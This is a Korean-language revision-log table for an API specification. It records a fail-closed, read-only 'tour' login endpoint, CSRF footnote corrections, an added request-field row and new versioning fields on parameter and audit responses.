| 2026-09-21 | `#1491` | **§1.2 「둘러보기」 정책 행 신설 · 인증 예외 경로 표·인증 엔드포인트 표에 `POST /auth/tour-login` 추가 · 「관리자가 되는 경로」 문장 보완 · dev-login 각주 옆 대조 문단 · CSRF 각주 수치 갱신 · §12 요약표 행 · §13.2 인증 API 대상 다섯 → 여섯** (`#1486`). 배포본은 `APP_ENV=staging`이라 `dev-login`이 등록되지 않는데(`#1058`), 인터뷰 대상자에게 로그인 없이 대시보드를 보여 줄 경로가 없었다. `_DEV_SURFACE_ENVS`에 `staging`을 더하면 `/docs`·시연 계정 시드까지 함께 열려 택하지 않고, **환경과 무관하게 항상 등록되되 `TOUR_ACCESS_CODE`로 잠기는** 별도 경로를 뒀다. ⚠️ **fail-closed** — 가입 제한(`#808`)의 판정은 둘 다 비면 **통과**인데 그 패턴을 쓰면 미설정 배포에서 **누구나 관리자**가 되므로 비어 있으면 **항상 거절**한다. 거절 문구는 꺼짐·불일치를 가르지 않는다(`PRD §6.3`). CSRF 각주는 종전 문장이 「8개 전부 공개」라면서 **7종만 열거**해 스스로 어긋나 있어 `#634` 당시 수치를 그대로 두고 현재 수치(38개 중 8개)를 따로 적었다 — `tests/test_auth_wiring.py`의 `_mutating_routes()`로 센 값이다. `AGENTS §4.3`상 행 추가·각주 보강이라 버전은 올리지 않는다 (#1486) |
| 2026-09-21 | `#1506` | **§5.1 요청 필드 표에 `destination_port_name` 행 신설** (`#1454`). 요청 예시 JSON에는 있었는데 **표에 행이 없었다** — 같은 문서가 자기와 어긋난 상태로, `#591`이 엔드포인트 요약표에서 겪은 것과 같은 유형이다. `N` · string · 최대 200자(서버 `Field(max_length=200)`와 같은 값) · 표기용. 요청 필드 표 ↔ pydantic 스키마를 대조하는 가드가 없어(`test_api_spec_endpoints_sync.py`는 엔드포인트만 본다) 빠진 채 남아 있었다. 행 추가라 `AGENTS §4.3`상 버전은 올리지 않는다. ⚠️ **이 행은 `#1506`이 머지된 뒤에 적었다** — 그 PR의 마지막 푸시에 들어가지 못했다(`AGENTS §4.1`). `#1484`→`#1487` 선례대로 다음 PR(`#1417`)이 함께 싣는다. (#1454) |
| 2026-09-21 | `#1511` | **§1.2 「둘러보기」 정책 행·인증 예외 경로 표·인증 엔드포인트 표·dev-login 대조 각주 · §12 요약표 정정** (`#1486`). `#1505`·`#1507`이 둘러보기를 **읽기 전용 + 공개 스위치**로 바꿨는데 정본을 함께 고치지 않아, `§1.2`가 *「둘러보기 세션에 별도 권한 가드는 **두지 않는다**(`#1486` 2026-09-21 결정)」*라고 **반대로** 적고 있었다 — 같은 저장소의 `docs/OPERATIONS.md §3.7`은 *「항상 읽기 전용」*이라 적어 **두 정본이 정면으로 어긋난 상태**였다. 고친 것 둘이다: ⑴ **문이 둘**이다 — `TOUR_ACCESS_CODE`(링크 코드)와 `TOUR_PUBLIC=true`(코드 없이 상시 버튼). 종전 문장은 *「하나로 잠긴다」*였다 ⑵ **권한은 문과 무관하게 항상 읽기 전용**이다 — 역할은 `ADMIN`이지만 인증 미들웨어가 쓰기 전체·`GET /auth/users`·`GET /audit-logs`·자기 탈퇴를 403으로 막는다(`auth/tour_policy.py`). **역할을 늘리는 것이 아니라 세션 정책 한 겹**이라 `PRD §5.2`의 역할 3종 제한과 부딪히지 않는다 — 뒤집힌 근거가 바로 그 제한이었다. 실서버 대조로 확인했다(빈 코드 `tour-login` 200 · `/vessels` 200 · `/auth/users` 403 · `/audit-logs` 403). `AGENTS §4.3`상 오기·값 정정이라 버전은 올리지 않는다 (#1486) |
| 2026-09-21 | `#1520` | **§7.1·§7.3·§7.4 쿼리 `active`(기본 `true` — 종전과 같다) · 응답에 판본 세 필드 `version`·`is_active`·`created_at` · §7.2 「연료에는 판본 이력이 없다」 각주 · §7.5 감사 `details` 표 신설(`source_refs`) · §16.1 `actor` 행·예시·각주** (`#1515` · `#1239` ③). 조회 4종의 필드가 고르지 않았다 — 연도는 `version`, 연료는 `is_active`·`?active=false`를 갖는데 **기준선·경계는 둘 다 없고 활성분만 줬다**(`repositories/parameters.py`의 `is_active == 1` 하드코딩). 개정 다음 날 사무직 화면에는 옛 판본 계산과 새 판본 계산이 나란히 놓이는데(`PRD §8.4`) 옛 판본의 값을 볼 경로가 없었다. ⚠️ **`active=false`의 뜻이 연료와 다르다** — 연료는 「비활성만」(`#444`부터의 계약, 유지), 세 조회는 「전부」다: 용도가 **나란히 놓고 비교**하는 것이라 현행 행이 빠지면 안 된다. 🔴 **계산 경로는 이 인자를 모른다** — 저장소 기본값(활성만)만 쓰며 `tests/test_parameters_api_db.py`가 소스를 훑어 잠근다. 연료는 제자리 갱신이라 이력이 없다는 사실을 **응답이 아니라 정본에** 적었다(「없음의 종류」 — 필드를 비워 두면 「아직 안 만들었다」로 읽힌다). 감사 응답은 `user_id`(UUID)만 실어 「누가 올렸나」에 답이 되지 않았다 — `actor`를 **덧붙이고** `user_id`는 그대로 둔다(필터 키). 탈퇴 계정도 푼다. `details`에 값의 **출처**가 없어 `source_refs`(고유·정렬)를 더했다 — 연료 CF 개정은 이것이 유일한 출처 기록이다. `AGENTS §4.3`상 필드·행 추가라 버전은 올리지 않는다 (#1515) |
